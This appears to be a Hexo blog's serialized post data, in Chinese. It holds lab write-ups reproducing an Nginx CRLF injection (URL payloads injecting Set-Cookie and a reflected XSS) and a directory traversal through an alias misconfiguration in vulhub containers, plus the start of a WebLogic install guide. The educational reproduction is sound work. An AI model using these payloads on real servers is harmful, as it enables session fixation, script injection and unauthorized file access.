title=\"0x02 漏洞复现\"></a>0x02 漏洞复现</h1><p>8080所在位置为CRLF注入漏洞<br>1、修改burp抓取数据包的端口为8089<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1626763746667-a4af1ae9-7a82-4633-a3ee-b6f720d0c16f.png#align=left&display=inline&height=265&margin=%5Bobject%2Object%5D&name=image.png&originHeight=530&originWidth=2222&size=96535&status=done&style=none&width=1111\" alt=\"image.png\"><br>2、访问<a href=\"https://127.0.0.1/\">http://127.0.0.1/</a>，页面会强制跳转到<a href=\"https://127.0.0.1,数据包如下/\">https://127.0.0.1，数据包如下</a><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1626763827997-81b931c7-332b-473d-9efa-3617874e6fe0.png#align=left&display=inline&height=463&margin=%5Bobject%2Object%5D&name=image.png&originHeight=926&originWidth=1804&size=210325&status=done&style=none&width=902\" alt=\"image.png\"><br>3、注意这里的Location参数值为即将要跳转的路径，下面更换访问路径如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1:8080/%0a%0dSet-Cookie:%20a=1</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1626763968311-2d1b4808-365e-4d3d-9562-00482672aa60.png#align=left&display=inline&height=537&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1074&originWidth=1818&size=249528&status=done&style=none&width=909\" alt=\"image.png\"><br>可以看到成功注入了Set-Cookie头，这里成功为攻击者设置了一个cookie，造成了<strong>会话固定</strong>漏洞。</p>\n<p>4、CRLF注入当然不仅能造成会话固定，当换行多一个的时候，便能够将内容输入到页面上，这里很明显到一个反射型XSS漏洞，payload如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1:8080/%0D%0ASet-Cookie:%20ajie123%0d%0a%0d%0a&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1626764298479-7bd1f1a8-6417-45f1-9116-ffc891d50f84.png#align=left&display=inline&height=480&margin=%5Bobject%2Object%5D&name=image.png&originHeight=960&originWidth=1800&size=237321&status=done&style=none&width=900\" alt=\"image.png\"></p>\n<h1 id=\"0x03-漏洞分析\"><a href=\"#0x03-漏洞分析\" class=\"headerlink\" title=\"0x03 漏洞分析\"></a>0x03 漏洞分析</h1><p>CRLF即回车换行，用字节来表示的话是\\r\\n，URL中就是%0D%0A，在http的header头部字段中，每一个参数后会自动跟上一个\\r\\n，也就是说如果没有正确识别我们输入的回车换行字段时，便可以通过回车换行使页面显示我们需要的数据。</p>\n<p>即如下情况:<br>正常的返回包</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">HTTP/1.1</span> <span class=\"number\">302</span> Moved Temporarily[\\r\\n]</span><br><span class=\"line\"><span class=\"attribute\">Server</span><span class=\"punctuation\">: </span>nginx/1.13.0[\\r\\n]</span><br><span class=\"line\"><span class=\"attribute\">Date</span><span class=\"punctuation\">: </span>Tue, 20 Jul 2021 06:57:29 GMT[\\r\\n]</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span><span class=\"punctuation\">: </span>text/html[\\r\\n]</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span><span class=\"punctuation\">: </span>161[\\r\\n]</span><br><span class=\"line\"><span class=\"attribute\">Connection</span><span class=\"punctuation\">: </span>close[\\r\\n]</span><br><span class=\"line\"><span class=\"attribute\">Location</span><span class=\"punctuation\">: </span>https://127.0.0.1/[\\r\\n]</span><br></pre></td></tr></table></figure>\n<p>设置cookie的返回包：</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">HTTP/1.1</span> <span class=\"number\">302</span> Moved Temporarily[\\r\\n]</span><br><span class=\"line\"><span class=\"attribute\">Server</span><span class=\"punctuation\">: </span>nginx/1.13.0[\\r\\n]</span><br><span class=\"line\"><span class=\"attribute\">Date</span><span class=\"punctuation\">: </span>Tue, 20 Jul 2021 06:57:29 GMT[\\r\\n]</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span><span class=\"punctuation\">: </span>text/html[\\r\\n]</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span><span class=\"punctuation\">: </span>161[\\r\\n]</span><br><span class=\"line\"><span class=\"attribute\">Connection</span><span class=\"punctuation\">: </span>close[\\r\\n]</span><br><span class=\"line\"><span class=\"attribute\">Location</span><span class=\"punctuation\">: </span>https://127.0.0.1/[\\r\\n][\\r\\n]%0a%0dSet-Cookie:%20a=1</span><br></pre></td></tr></table></figure>\n<p>设置xss的返回包：</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">HTTP/1.1</span> <span class=\"number\">302</span> Moved Temporarily[\\r\\n]</span><br><span class=\"line\"><span class=\"attribute\">Server</span><span class=\"punctuation\">: </span>nginx/1.13.0[\\r\\n]</span><br><span class=\"line\"><span class=\"attribute\">Date</span><span class=\"punctuation\">: </span>Tue, 20 Jul 2021 06:57:29 GMT[\\r\\n]</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span><span class=\"punctuation\">: </span>text/html[\\r\\n]</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span><span class=\"punctuation\">: </span>161[\\r\\n]</span><br><span class=\"line\"><span class=\"attribute\">Connection</span><span class=\"punctuation\">: </span>close[\\r\\n]</span><br><span class=\"line\"><span class=\"attribute\">Location</span><span class=\"punctuation\">: </span>https://127.0.0.1/[\\r\\n][\\r\\n]%0a%0dSet-Cookie:%20a=1[\\r\\n][\\r\\n]&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"Hexo","link":"https://hexo.io/zh-tw/","avatar":"https://d33wubrfki0l68.cloudfront.net/6657ba50e702d84afb32fe846bed54fba1a77add/827ae/logo.svg","descr":"快速、簡單且強大的網誌框架"}]},{"class_name":"網站","class_desc":"值得推薦的網站","link_list":[{"name":"Youtube","link":"https://www.youtube.com/","avatar":"https://i.loli.net/2020/05/14/9ZkGg8v3azHJfM1.png","descr":"視頻網站"},{"name":"Weibo","link":"https://www.weibo.com/","avatar":"https://i.loli.net/2020/05/14/TLJBum386vcnI1P.png","descr":"中國最大社交分享平台"},{"name":"Twitter","link":"https://twitter.com/","avatar":"https://i.loli.net/2020/05/14/5VyHPQqR6LWF39a.png","descr":"社交分享平台"}]}]}},"excerpt":"","more":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<h1 id=\"0x01-复现环境\"><a href=\"#0x01-复现环境\" class=\"headerlink\" title=\"0x01 复现环境\"></a>0x01 复现环境</h1><p>本地搭建docker+vulhub</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd vulhub-master </span><br><span class=\"line\">cd nginx/insecure-configuration </span><br><span class=\"line\">docker-compose up -d</span><br></pre></td></tr></table></figure>\n\n\n<h1 id=\"0x02-漏洞复现\"><a href=\"#0x02-漏洞复现\" class=\"headerlink\" title=\"0x02 漏洞复现\"></a>0x02 漏洞复现</h1><p>8080所在位置为CRLF注入漏洞<br>1、修改burp抓取数据包的端口为8089<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1626763746667-a4af1ae9-7a82-4633-a3ee-b6f720d0c16f.png#align=left&display=inline&height=265&margin=%5Bobject%2Object%5D&name=image.png&originHeight=530&originWidth=2222&size=96535&status=done&style=none&width=1111\" alt=\"image.png\"><br>2、访问<a href=\"https://127.0.0.1/\">http://127.0.0.1/</a>，页面会强制跳转到<a href=\"https://127.0.0.1,数据包如下/\">https://127.0.0.1，数据包如下</a><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1626763827997-81b931c7-332b-473d-9efa-3617874e6fe0.png#align=left&display=inline&height=463&margin=%5Bobject%2Object%5D&name=image.png&originHeight=926&originWidth=1804&size=210325&status=done&style=none&width=902\" alt=\"image.png\"><br>3、注意这里的Location参数值为即将要跳转的路径，下面更换访问路径如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1:8080/%0a%0dSet-Cookie:%20a=1</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1626763968311-2d1b4808-365e-4d3d-9562-00482672aa60.png#align=left&display=inline&height=537&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1074&originWidth=1818&size=249528&status=done&style=none&width=909\" alt=\"image.png\"><br>可以看到成功注入了Set-Cookie头，这里成功为攻击者设置了一个cookie，造成了<strong>会话固定</strong>漏洞。</p>\n<p>4、CRLF注入当然不仅能造成会话固定，当换行多一个的时候，便能够将内容输入到页面上，这里很明显到一个反射型XSS漏洞，payload如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1:8080/%0D%0ASet-Cookie:%20ajie123%0d%0a%0d%0a&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1626764298479-7bd1f1a8-6417-45f1-9116-ffc891d50f84.png#align=left&display=inline&height=480&margin=%5Bobject%2Object%5D&name=image.png&originHeight=960&originWidth=1800&size=237321&status=done&style=none&width=900\" alt=\"image.png\"></p>\n<h1 id=\"0x03-漏洞分析\"><a href=\"#0x03-漏洞分析\" class=\"headerlink\" title=\"0x03 漏洞分析\"></a>0x03 漏洞分析</h1><p>CRLF即回车换行，用字节来表示的话是\\r\\n，URL中就是%0D%0A，在http的header头部字段中，每一个参数后会自动跟上一个\\r\\n，也就是说如果没有正确识别我们输入的回车换行字段时，便可以通过回车换行使页面显示我们需要的数据。</p>\n<p>即如下情况:<br>正常的返回包</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">HTTP/1.1</span> <span class=\"number\">302</span> Moved Temporarily[\\r\\n]</span><br><span class=\"line\"><span class=\"attribute\">Server</span><span class=\"punctuation\">: </span>nginx/1.13.0[\\r\\n]</span><br><span class=\"line\"><span class=\"attribute\">Date</span><span class=\"punctuation\">: </span>Tue, 20 Jul 2021 06:57:29 GMT[\\r\\n]</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span><span class=\"punctuation\">: </span>text/html[\\r\\n]</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span><span class=\"punctuation\">: </span>161[\\r\\n]</span><br><span class=\"line\"><span class=\"attribute\">Connection</span><span class=\"punctuation\">: </span>close[\\r\\n]</span><br><span class=\"line\"><span class=\"attribute\">Location</span><span class=\"punctuation\">: </span>https://127.0.0.1/[\\r\\n]</span><br></pre></td></tr></table></figure>\n<p>设置cookie的返回包：</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">HTTP/1.1</span> <span class=\"number\">302</span> Moved Temporarily[\\r\\n]</span><br><span class=\"line\"><span class=\"attribute\">Server</span><span class=\"punctuation\">: </span>nginx/1.13.0[\\r\\n]</span><br><span class=\"line\"><span class=\"attribute\">Date</span><span class=\"punctuation\">: </span>Tue, 20 Jul 2021 06:57:29 GMT[\\r\\n]</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span><span class=\"punctuation\">: </span>text/html[\\r\\n]</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span><span class=\"punctuation\">: </span>161[\\r\\n]</span><br><span class=\"line\"><span class=\"attribute\">Connection</span><span class=\"punctuation\">: </span>close[\\r\\n]</span><br><span class=\"line\"><span class=\"attribute\">Location</span><span class=\"punctuation\">: </span>https://127.0.0.1/[\\r\\n][\\r\\n]%0a%0dSet-Cookie:%20a=1</span><br></pre></td></tr></table></figure>\n<p>设置xss的返回包：</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">HTTP/1.1</span> <span class=\"number\">302</span> Moved Temporarily[\\r\\n]</span><br><span class=\"line\"><span class=\"attribute\">Server</span><span class=\"punctuation\">: </span>nginx/1.13.0[\\r\\n]</span><br><span class=\"line\"><span class=\"attribute\">Date</span><span class=\"punctuation\">: </span>Tue, 20 Jul 2021 06:57:29 GMT[\\r\\n]</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span><span class=\"punctuation\">: </span>text/html[\\r\\n]</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span><span class=\"punctuation\">: </span>161[\\r\\n]</span><br><span class=\"line\"><span class=\"attribute\">Connection</span><span class=\"punctuation\">: </span>close[\\r\\n]</span><br><span class=\"line\"><span class=\"attribute\">Location</span><span class=\"punctuation\">: </span>https://127.0.0.1/[\\r\\n][\\r\\n]%0a%0dSet-Cookie:%20a=1[\\r\\n][\\r\\n]&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>\n\n"},{"title":"Nginx中间件漏洞之目录穿越","keywords":"web安全,Nginx,中间件漏洞","description":"Nginx中间件漏洞之目录穿越","cover":"https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fupload-images.jianshu.io%2Fupload_images%2F3778244-65c62b2e2775b20a.png%3FimageMogr2%2Fauto-orient%2Fstrip%257CimageView2%2F2%2Fw%2F1240&refer=http%3A%2F%2Fupload-images.jianshu.io&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630941831&t=6d3fe55cc7cb43085f42e676981de631","date":"2021-08-06T01:45:41.000Z","_content":"\n<meta name=\"referrer\" content=\"no-referrer\"/>\n\n# 0x01 复现环境\n\n本地搭建docker+vulhub\n```shell\ncd vulhub-master \ncd nginx/insecure-configuration \ndocker-compose up -d\n```\n访问[http://127.0.0.1:8081/files/](http://127.0.0.1:8081/files/)显示如下界面即搭建成功\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1626762972928-b9934d33-9b5d-49a7-9710-443d17b6f35d.png#align=left&display=inline&height=250&margin=%5Bobject%2Object%5D&name=image.png&originHeight=500&originWidth=1200&size=45202&status=done&style=none&width=600)\n\n# 0x02 漏洞复现\n\n这个常见于 Nginx 做反向代理的情况，动态的部分被 proxy_pass 传递给后端端口，而静态文件需要 Nginx 来处理。\n假设静态文件存储在 /home/ 目录下，而该目录在 url 中名字为 files ，那么就需要用 alias 设置目录的别名：\n\n```\nlocation /files {\n    alias /home/;\n}\n```\n当使用如下配置的情况下，就存在目录穿越漏洞，payload如下：\n```shell\nhttp://127.0.0.1:8081/files../\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1626763021203-ec62dc04-8a66-41b7-b64b-48a4b58390c3.png#align=left&display=inline&height=568&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1136&originWidth=1980&size=177487&status=done&style=none&width=990)\n# 0x03 漏洞分析\n正常输入http:ip:port/files/help.txt，访问到file目录下到help.txt文件\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1626763091219-7ec90fec-239a-47c8-9abf-ab5d8ddceed5.png#align=left&display=inline&height=165&margin=%5Bobject%2Object%5D&name=image.png&originHeight=330&originWidth=1132&size=31821&status=done&style=none&width=566)\n根据配置情况可以发现，/file的后面没有/，也就是只要输入/file便表示代理到服务器的/home/目录下了。\n当我们输入/file../，在服务器上对应的就是/home/../，所以跳转到根目录，造成了目录穿越，如下图：\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1626763482134-4c4b2eb7-8d7c-49ef-8716-5ea99a66dade.png#align=left&display=inline&height=574&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1148&originWidth=1812&size=173397&status=done&style=none&width=906)\n","source":"_posts/Nginx中间件漏洞之目录穿越.md","raw":"---\ntitle: Nginx中间件漏洞之目录穿越\ntags: \n  - Nginx\n  - 中间件漏洞\n  - web安全\ncategories: 中间件安全\nkeywords: 'web安全,Nginx,中间件漏洞'\ndescription: Nginx中间件漏洞之目录穿越\ncover: https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fupload-images.jianshu.io%2Fupload_images%2F3778244-65c62b2e2775b20a.png%3FimageMogr2%2Fauto-orient%2Fstrip%257CimageView2%2F2%2Fw%2F1240&refer=http%3A%2F%2Fupload-images.jianshu.io&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630941831&t=6d3fe55cc7cb43085f42e676981de631\ndate: 2021-08-06 09:45:41\n---\n\n<meta name=\"referrer\" content=\"no-referrer\"/>\n\n# 0x01 复现环境\n\n本地搭建docker+vulhub\n```shell\ncd vulhub-master \ncd nginx/insecure-configuration \ndocker-compose up -d\n```\n访问[http://127.0.0.1:8081/files/](http://127.0.0.1:8081/files/)显示如下界面即搭建成功\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1626762972928-b9934d33-9b5d-49a7-9710-443d17b6f35d.png#align=left&display=inline&height=250&margin=%5Bobject%2Object%5D&name=image.png&originHeight=500&originWidth=1200&size=45202&status=done&style=none&width=600)\n\n# 0x02 漏洞复现\n\n这个常见于 Nginx 做反向代理的情况，动态的部分被 proxy_pass 传递给后端端口，而静态文件需要 Nginx 来处理。\n假设静态文件存储在 /home/ 目录下，而该目录在 url 中名字为 files ，那么就需要用 alias 设置目录的别名：\n\n```\nlocation /files {\n    alias /home/;\n}\n```\n当使用如下配置的情况下，就存在目录穿越漏洞，payload如下：\n```shell\nhttp://127.0.0.1:8081/files../\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1626763021203-ec62dc04-8a66-41b7-b64b-48a4b58390c3.png#align=left&display=inline&height=568&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1136&originWidth=1980&size=177487&status=done&style=none&width=990)\n# 0x03 漏洞分析\n正常输入http:ip:port/files/help.txt，访问到file目录下到help.txt文件\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1626763091219-7ec90fec-239a-47c8-9abf-ab5d8ddceed5.png#align=left&display=inline&height=165&margin=%5Bobject%2Object%5D&name=image.png&originHeight=330&originWidth=1132&size=31821&status=done&style=none&width=566)\n根据配置情况可以发现，/file的后面没有/，也就是只要输入/file便表示代理到服务器的/home/目录下了。\n当我们输入/file../，在服务器上对应的就是/home/../，所以跳转到根目录，造成了目录穿越，如下图：\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1626763482134-4c4b2eb7-8d7c-49ef-8716-5ea99a66dade.png#align=left&display=inline&height=574&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1148&originWidth=1812&size=173397&status=done&style=none&width=906)\n","slug":"Nginx中间件漏洞之目录穿越","published":1,"updated":"2021-08-07T16:14:57.651Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckt46mpf3000bvkq3dw0q6zot","content":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<h1 id=\"0x01-复现环境\"><a href=\"#0x01-复现环境\" class=\"headerlink\" title=\"0x01 复现环境\"></a>0x01 复现环境</h1><p>本地搭建docker+vulhub</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd vulhub-master </span><br><span class=\"line\">cd nginx/insecure-configuration </span><br><span class=\"line\">docker-compose up -d</span><br></pre></td></tr></table></figure>\n<p>访问<a href=\"http://127.0.0.1:8081/files/\">http://127.0.0.1:8081/files/</a>显示如下界面即搭建成功<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1626762972928-b9934d33-9b5d-49a7-9710-443d17b6f35d.png#align=left&display=inline&height=250&margin=%5Bobject%2Object%5D&name=image.png&originHeight=500&originWidth=1200&size=45202&status=done&style=none&width=600\" alt=\"image.png\"></p>\n<h1 id=\"0x02-漏洞复现\"><a href=\"#0x02-漏洞复现\" class=\"headerlink\" title=\"0x02 漏洞复现\"></a>0x02 漏洞复现</h1><p>这个常见于 Nginx 做反向代理的情况，动态的部分被 proxy_pass 传递给后端端口，而静态文件需要 Nginx 来处理。<br>假设静态文件存储在 /home/ 目录下，而该目录在 url 中名字为 files ，那么就需要用 alias 设置目录的别名：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location /files &#123;</span><br><span class=\"line\">    alias /home/;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>当使用如下配置的情况下，就存在目录穿越漏洞，payload如下：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1:8081/files../</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1626763021203-ec62dc04-8a66-41b7-b64b-48a4b58390c3.png#align=left&display=inline&height=568&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1136&originWidth=1980&size=177487&status=done&style=none&width=990\" alt=\"image.png\"></p>\n<h1 id=\"0x03-漏洞分析\"><a href=\"#0x03-漏洞分析\" class=\"headerlink\" title=\"0x03 漏洞分析\"></a>0x03 漏洞分析</h1><p>正常输入http:ip:port/files/help.txt，访问到file目录下到help.txt文件<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1626763091219-7ec90fec-239a-47c8-9abf-ab5d8ddceed5.png#align=left&display=inline&height=165&margin=%5Bobject%2Object%5D&name=image.png&originHeight=330&originWidth=1132&size=31821&status=done&style=none&width=566\" alt=\"image.png\"><br>根据配置情况可以发现，/file的后面没有/，也就是只要输入/file便表示代理到服务器的/home/目录下了。<br>当我们输入/file../，在服务器上对应的就是/home/../，所以跳转到根目录，造成了目录穿越，如下图：<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1626763482134-4c4b2eb7-8d7c-49ef-8716-5ea99a66dade.png#align=left&display=inline&height=574&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1148&originWidth=1812&size=173397&status=done&style=none&width=906\" alt=\"image.png\"></p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"Hexo","link":"https://hexo.io/zh-tw/","avatar":"https://d33wubrfki0l68.cloudfront.net/6657ba50e702d84afb32fe846bed54fba1a77add/827ae/logo.svg","descr":"快速、簡單且強大的網誌框架"}]},{"class_name":"網站","class_desc":"值得推薦的網站","link_list":[{"name":"Youtube","link":"https://www.youtube.com/","avatar":"https://i.loli.net/2020/05/14/9ZkGg8v3azHJfM1.png","descr":"視頻網站"},{"name":"Weibo","link":"https://www.weibo.com/","avatar":"https://i.loli.net/2020/05/14/TLJBum386vcnI1P.png","descr":"中國最大社交分享平台"},{"name":"Twitter","link":"https://twitter.com/","avatar":"https://i.loli.net/2020/05/14/5VyHPQqR6LWF39a.png","descr":"社交分享平台"}]}]}},"excerpt":"","more":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<h1 id=\"0x01-复现环境\"><a href=\"#0x01-复现环境\" class=\"headerlink\" title=\"0x01 复现环境\"></a>0x01 复现环境</h1><p>本地搭建docker+vulhub</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd vulhub-master </span><br><span class=\"line\">cd nginx/insecure-configuration </span><br><span class=\"line\">docker-compose up -d</span><br></pre></td></tr></table></figure>\n<p>访问<a href=\"http://127.0.0.1:8081/files/\">http://127.0.0.1:8081/files/</a>显示如下界面即搭建成功<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1626762972928-b9934d33-9b5d-49a7-9710-443d17b6f35d.png#align=left&display=inline&height=250&margin=%5Bobject%2Object%5D&name=image.png&originHeight=500&originWidth=1200&size=45202&status=done&style=none&width=600\" alt=\"image.png\"></p>\n<h1 id=\"0x02-漏洞复现\"><a href=\"#0x02-漏洞复现\" class=\"headerlink\" title=\"0x02 漏洞复现\"></a>0x02 漏洞复现</h1><p>这个常见于 Nginx 做反向代理的情况，动态的部分被 proxy_pass 传递给后端端口，而静态文件需要 Nginx 来处理。<br>假设静态文件存储在 /home/ 目录下，而该目录在 url 中名字为 files ，那么就需要用 alias 设置目录的别名：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location /files &#123;</span><br><span class=\"line\">    alias /home/;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>当使用如下配置的情况下，就存在目录穿越漏洞，payload如下：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1:8081/files../</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1626763021203-ec62dc04-8a66-41b7-b64b-48a4b58390c3.png#align=left&display=inline&height=568&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1136&originWidth=1980&size=177487&status=done&style=none&width=990\" alt=\"image.png\"></p>\n<h1 id=\"0x03-漏洞分析\"><a href=\"#0x03-漏洞分析\" class=\"headerlink\" title=\"0x03 漏洞分析\"></a>0x03 漏洞分析</h1><p>正常输入http:ip:port/files/help.txt，访问到file目录下到help.txt文件<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1626763091219-7ec90fec-239a-47c8-9abf-ab5d8ddceed5.png#align=left&display=inline&height=165&margin=%5Bobject%2Object%5D&name=image.png&originHeight=330&originWidth=1132&size=31821&status=done&style=none&width=566\" alt=\"image.png\"><br>根据配置情况可以发现，/file的后面没有/，也就是只要输入/file便表示代理到服务器的/home/目录下了。<br>当我们输入/file../，在服务器上对应的就是/home/../，所以跳转到根目录，造成了目录穿越，如下图：<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1626763482134-4c4b2eb7-8d7c-49ef-8716-5ea99a66dade.png#align=left&display=inline&height=574&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1148&originWidth=1812&size=173397&status=done&style=none&width=906\" alt=\"image.png\"></p>\n"},{"title":"Windows搭建weblogic环境","keywords":"环境搭建,weblogic,windows","description":"Windows搭建weblogic环境","cover":"https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fwww.51wendang.com%2Fpic%2F10b9ee610cba11bb1d02938e%2F5-810-jpg_6-1080-0-0-1080.jpg&refer=http%3A%2F%2Fwww.51wendang.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630917022&t=a4900175111cf1e7c26c7a5ed713c7af","date":"2020-09-30T02:45:41.000Z","_content":"\n介于网络上weblogic漏洞环境基本上都是通过docker+vulhub进行搭建的，而有的小伙伴想要通过windows来搭建而没有教程，下面我将向大家介绍如何通过windows来搭建weblogic环境。\n\n\n1、下载好weblogic的安装文件，双击运行\n下载地址：https://www.oracle.com/middleware/technologies/weblogic.html\n![upload successful](/images/16/1.png) \n\n2、读条结束弹出安装界面\n![upload successful](/images/16/2.png) \n\n3、点击下一步，设置目录\n![upload successful](/images/16/3.png) \n\n4、设置好目录后，进入设置更新界面，这里将勾去掉，不更新。\n![upload successful](/images/16/4.png) \n\n5、下一步，安装类型选择典型即可\n![upload successful](/images/16/5.png) \n\n6、安装目录，这里我选择默认，也可以自行调整\n![upload successful](/images/16/6.png) \n\n7、快捷方式，直接下一步\n![upload successful](/images/16/7.png) \n\n8、安装概要，不配置，下一步\n![upload successful](/images/16/8.png) 